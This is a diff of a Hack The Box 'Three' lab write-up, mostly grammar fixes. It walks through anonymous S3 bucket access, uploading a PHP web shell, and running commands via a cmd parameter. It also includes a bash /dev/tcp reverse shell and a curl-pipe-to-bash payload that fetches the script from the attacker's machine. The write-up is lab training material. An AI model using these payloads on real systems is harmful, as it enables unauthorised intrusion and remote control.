@@ -22,9 +22,7 @@ layout:
 * **Tags **<mark style="color:green;">**->**</mark> Cloud / Custom Applications / AWS / Reconnaissance / Web Site Structure Discovery\
   &#x20;             Bucket Enumeration / Arbitrary File Upload / Anonymous-Guest Access
 
-<figure><img src="../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>
-
-
+<figure><img src="../../.gitbook/assets/image (121).png" alt=""><figcaption><p><a href="https://app.hackthebox.com/starting-point?tier=1">https://app.hackthebox.com/starting-point?tier=1</a></p></figcaption></figure>
 
 ## <mark style="color:blue;">Write-up</mark>
 
@@ -37,9 +35,9 @@ layout:
 
 ***
 
-* With this we can answer the first question
+* With this, we can answer the first question
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 > Answer: **2**
 
@@ -57,19 +55,19 @@ nmap -p22,80 -sVC 10.129.246.158
 
 ***
 
-* As it has a http service running on port 80 we know it is a web page, and we can go check it on the browser
+* As it has an HTTP service running on port 80, we know it is a web page, and we can go check it on the browser
 
 <figure><img src="../../.gitbook/assets/image (218).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
-* As we navigate through the page, in the contact section we find some information, specially an email with a curious domain
+* As we navigate through the page, in the contact section we find some information, especially an email with a curious domain
 
 <figure><img src="../../.gitbook/assets/image (220).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
-* With this and a little research we can answer the some questions
+* With this and a little research, we can answer some questions
 
 <figure><img src="../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>
 
@@ -83,7 +81,7 @@ nmap -p22,80 -sVC 10.129.246.158
 
 ***
 
-* Now we can add the domain to our known domains editing the _/etc/host_ fastly with the help of _echo_ and _tee_ commands. Then we check the content have been saved correctly
+* Now we can add the domain to our known domains by editing the _/etc/hosts_ file. We can do it in a faster way with the help of the `echo` and `tee` commands. Then we check the content has been saved correctly
 
 {% code lineNumbers="true" %}
 ```bash
@@ -95,7 +93,7 @@ echo "10.129.246.158 thetoppers.htb" | sudo tee -a /etc/hosts
 
 ***
 
-* Now we can make use of the _gobuster_ tool to enumerate the domain with fuzzing, specifically we can check if exist any related subdomain. After the operation has fisnished we find the subdomain _s3.thetoppers.htb_ and with a little research we can know it is a cloud database on amazon servers.
+* Now we can use the _gobuster_ tool to enumerate the domain with fuzzing, and specifically check if there are any related subdomains. After the operation has finished we find the subdomain _s3.thetoppers.htb_ and with a little research we can know it is a cloud database on Amazon servers.
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
@@ -107,7 +105,7 @@ gobuster vhost -u http://thetoppers.htb/ -w /usr/share/wordlists/SecLists/Discov
 
 ***
 
-* With this information and some reasearch abour the amazon service we can answer some questions
+* With this information and some research about the Amazon service we can answer some questions
 
 <figure><img src="../../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>
 
@@ -139,7 +137,7 @@ gobuster vhost -u http://thetoppers.htb/ -w /usr/share/wordlists/SecLists/Discov
 
 ***
 
-* We also add the discovered  subdomain to the well-known host list
+* We also add the discovered subdomain to the well-known host list
 
 {% code lineNumbers="true" %}
 ```bash
@@ -151,25 +149,25 @@ echo "10.129.246.158 s3.thetoppers.htb" | sudo tee -a /etc/hosts
 
 ***
 
-* Now we can try to connect to the S3 service with the _awscli_ utility. First we configure the tool, in this case we indicate that it will be a temporary connection with the _temp_ value (This are also the default credentials for aws connections).
+* Now we can try to connect to the S3 service with the _awscli_ utility. First, we configure the tool, in this case, we indicate that it will be a temporary connection with the _temp_ value (These are also the default credentials for AWS connections).
 
 <figure><img src="../../.gitbook/assets/image (224).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
-* Now we try to list the S3 bueckets elements and we find one named _thetoppers.htbd_
+* Now we try to list the S3 bucket elements and we find one named _thetoppers.htbd_
 
 <figure><img src="../../.gitbook/assets/image (229).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
-* We try listing the bucket elements and we find a _index.php_ file, which is the main code file with which have been constructed the web page.
+* We try listing the bucket elements and we find an _index.php_ file, which is the main code file of the web page.
 
 <figure><img src="../../.gitbook/assets/image (231).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
-* With this we can answer the next question
+* With this, we can answer the next question
 
 <figure><img src="../../.gitbook/assets/image (244).png" alt=""><figcaption></figcaption></figure>
 
@@ -177,7 +175,7 @@ echo "10.129.246.158 s3.thetoppers.htb" | sudo tee -a /etc/hosts
 
 ***
 
-* Then, as we have connection to the S3 instance we can try to upload a custom file to the bucket with a payload to gain Remote Command Execution, so we create a _Shell.php_ file for this purpose.
+* Then, as we have a connection to the S3 instance we can try to upload a custom file to the bucket with a payload to gain Remote Command Execution. We create a _Shell.php_ file for this purpose.
 
 {% code lineNumbers="true" %}
 ```bash
@@ -193,7 +191,7 @@ sudo nano Shell.php
 
 ***
 
-* Then we upload the file to the bucket, and check it listing the contents of the bucket again
+* Then we upload the file to the bucket, and check it by listing the contents of the bucket again
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
@@ -205,7 +203,7 @@ aws --endpoint=http://s3.thetoppers.htb s3 cp Shell.php s3://thetoppers.htb
 
 ***
 
-* If we access to the bucket from the browser and try sending a comand as value with the parameter _cmd_ it will excute it, we have gained RCE.&#x20;
+* If we access the bucket from the browser and try to send _cmd_ as a parameter and a command as a value, we see the server will execute it. With this, we confirm we have gained RCE.
 
 {% code title="Payload" lineNumbers="true" %}
 ```url
@@ -229,7 +227,7 @@ http://thetoppers.htb/Shell.php?cmd=ls /var/www
 
 ***
 
-* Finally we check the content of the file.
+* Finally, we check the content of the file.
 
 {% code title="Payload" lineNumbers="true" %}
 ```url
@@ -241,7 +239,7 @@ http://thetoppers.htb/Shell.php?cmd=cat /var/www/flag.txt
 
 ***
 
-* With this we have got the root flag and have pawned the machine
+* With this, we have got the root flag and have pawned the machine
 
 <figure><img src="../../.gitbook/assets/image (245).png" alt=""><figcaption></figcaption></figure>
 
@@ -249,11 +247,9 @@ http://thetoppers.htb/Shell.php?cmd=cat /var/www/flag.txt
 
 ***
 
-
-
 ## <mark style="color:blue;">Alternative</mark>
 
-* Instead of abusing the RCE diectly on the browser we can try to get a Reverse Shell on the machine. First we create a simple bash script to send the shell connection to our machine.
+* Instead of abusing the RCE directly on the browser, we can try to get a Reverse Shell on the machine. First, we create a simple bash script to send the shell connection to our machine.
 
 {% code lineNumbers="true" %}
 ```bash
@@ -270,12 +266,12 @@ bash -i >& /dev/tcp/10.10.14.195/1234 0>&1
 {% endcode %}
 
 {% hint style="info" %}
-We can check our IP with`ifconfig`, normally will be the one on the _tun0_ network interface
+We can check our IP with the`ifconfig` command. Normally will be the one on the _tun0_ network interface as this is the interface of the VPN we are connected to.
 {% endhint %}
 
 ***
 
-* Then we stablish a _netcat_ listener on the arbitrary port chosen above
+* Then we establish a Netcat listener on the arbitrary port chosen above
 
 {% code lineNumbers="true" %}
 ```sh
@@ -287,7 +283,7 @@ nc -nvlp 1234
 
 ***
 
-* After this, in another terminal we stablish a http server with _python_ on the same folder where the _shell.sh_ is to host it, and we choose another arbitrary port for the server.
+* After this, in another terminal, we establish an HTTP server using Python in the same folder where the _shell.sh_ file is. We choose another arbitrary port for the server.
 
 {% code lineNumbers="true" %}
 ```bash
@@ -299,7 +295,7 @@ python -m http.server 4444
 
 ***
 
-* Now we use the RCM to send the shell from the target to our machine using de curl command. We will see the page remain loading.
+* Now we use the RCE to send the shell from the target to our machine using the curl command. We will see the page remain loading.
 
 {% code title="Payload" overflow="wrap" lineNumbers="true" %}
 ```url
@@ -311,12 +307,12 @@ http://thetoppers.htb/Shell.php?cmd=curl%2010.10.14.195:4444/shell.sh|bash
 
 ***
 
-* Also if we check the python server info we see it has recieve a petition
+* If we check the Python server info, we see it has received a petition
 
 <figure><img src="../../.gitbook/assets/image (255).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
-* Finally we can check our _netcat_ listener and will see that we have gained a shell from the machine, with this we can interact with the system more comfortably.
+* Finally, we can check our Netcat listener and we will see that we have gained a shell from the machine, with this we can interact with the system more comfortably.
 
 <figure><img src="../../.gitbook/assets/image (256).png" alt=""><figcaption></figcaption></figure>
